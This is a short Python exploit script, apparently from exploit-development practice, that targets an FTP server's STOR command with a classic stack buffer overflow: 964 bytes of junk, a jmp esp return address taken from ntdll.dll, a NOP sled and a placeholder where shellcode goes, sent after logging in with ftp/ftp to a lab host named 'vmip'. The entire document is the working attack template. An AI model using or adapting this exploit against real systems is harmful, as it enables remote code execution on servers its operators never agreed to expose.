from socket import *
import struct

IP = "vmip"
PORT = "21"
ID = "ftp"
PW = "ftp"
jmpesp = struct.pack('<L', 0x77f1E871) # ntdll.dll

buf =  b"\x90"*32
buf += b"PAYLOAD"

data = "A"*964 + jmpesp + buf # Junk jmp esp + payload.

s = socket(AF_INET, SOCK_STREAM)
s.connect((IP,int(PORT)))
s.send("USER {}\r\n".format(ID)) # Format the user as ftp -> Ensure you set this in your enviornment via the application.
s.recv(1024)
s.send("PASS {}\r\n".format(PW)) # Pass the password of FTP.
s.recv(1024)
       
print "[*]Send exploit...", # Send.
s.send("STOR {}\r\n".format(data)) # STOR command + your payload aka buf.
print "Done" # final.
